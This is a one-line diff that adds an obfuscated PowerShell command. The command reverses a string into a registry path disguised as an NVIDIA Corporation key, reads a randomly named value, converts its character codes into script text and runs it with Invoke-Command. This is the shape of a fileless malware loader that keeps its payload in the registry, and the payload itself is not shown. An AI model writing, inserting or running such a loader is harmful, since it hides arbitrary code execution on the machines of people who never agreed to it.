@@ -1,0 +1,1 @@
+$hbbkvvMMCOt=[ScriptBlock]; icm ($hbbkvvMMCOt::Create([string]::Join('', ((gp (([regex]::Matches('4Aga7og8noitaroproC AIDIVN\ERAWTFOS\:MLKH','.','RightToLeft') | ForEach {$_.value}) -join '')).'cVX0ub48obQ' | % { [char]$_ }))))
